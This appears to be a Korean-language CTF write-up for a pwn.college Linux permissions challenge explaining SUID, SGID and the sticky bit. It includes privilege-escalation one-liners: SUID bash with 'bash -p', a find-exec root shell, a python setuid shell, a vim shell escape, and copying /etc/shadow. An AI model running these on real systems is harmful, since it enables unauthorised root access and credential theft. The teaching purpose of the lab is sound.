# The SUID Bit

**Module:** Linux Luminarium → Perceiving Permissions  
**Challenge:** #8  
**Tags:** `SUID`, `privilege-escalation`, `chmod`

---

## 문제 설명

SUID 비트를 설정하거나 활용하여 root 권한으로 파일을 읽는다.

---

## 풀이

### 시나리오 1: SUID 바이너리 생성
```bash
# bash에 SUID 설정 (root가 허용한 경우)
chmod u+s /usr/bin/bash
bash -p          # -p: SUID 권한 유지 모드
whoami           # root
cat /flag
```

### 시나리오 2: SUID 바이너리 찾아서 활용
```bash
# SUID 파일 탐색
find / -perm -4000 -type f 2>/dev/null

# 결과 예시
# -rwsr-xr-x 1 root root /usr/bin/find
# -rwsr-xr-x 1 root root /usr/bin/cat

# SUID cat으로 flag 읽기
/usr/bin/cat /flag
```

### 시나리오 3: 챌린지가 SUID 설정 요구
```bash
# 챌린지가 지정한 파일에 SUID 설정
chmod 4755 /challenge/target
# 또는
chmod u+s /challenge/target

/challenge/run
# pwn.college{...}
```

---

## SUID 동작 원리

```c
// 일반 실행
execve("/challenge/run", ...)
// 실행 UID = 현재 사용자 (hacker)

// SUID 실행 파일
execve("/challenge/run", ...)  // -rwsr-xr-x (root 소유)
// 실행 UID = 파일 소유자 (root!)
// → root로 /flag 읽기 가능
```

```bash
# 확인 방법
ls -la /challenge/run
# -rwsr-xr-x 1 root root ...  ← s = SUID

# 실행 시 ID 확인
/challenge/run whoami   # root (SUID 바이너리인 경우)
```

---

## GTFOBins - SUID 활용 목록

SUID가 설정된 일반 도구로 권한 상승:

```bash
# find SUID
find / -exec /bin/bash -p \; -quit

# bash -p (SUID bash)
bash -p
whoami  # root

# cp SUID: /etc/shadow 복사
cp /etc/shadow /tmp/shadow

# cat SUID
cat /flag

# python SUID
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# vim SUID
vim -c ':!/bin/bash'
```

---

## SGID (Set Group ID)

```bash
# 파일: 그룹 권한으로 실행
chmod g+s file
# -rwxr-sr-x ← s = SGID

# 디렉토리: 새 파일이 부모 그룹 상속
chmod g+s /shared/dir
mkdir /shared/dir/newdir  # → 그룹이 /shared/dir와 동일

# SGID 파일 찾기
find / -perm -2000 -type f 2>/dev/null
```

---

## Sticky Bit

```bash
# 디렉토리에 설정: 소유자만 삭제 가능
chmod +t /tmp
ls -ld /tmp
# drwxrwxrwt  ← t = sticky bit

# /tmp는 모두 쓸 수 있지만 남의 파일 삭제 불가
```
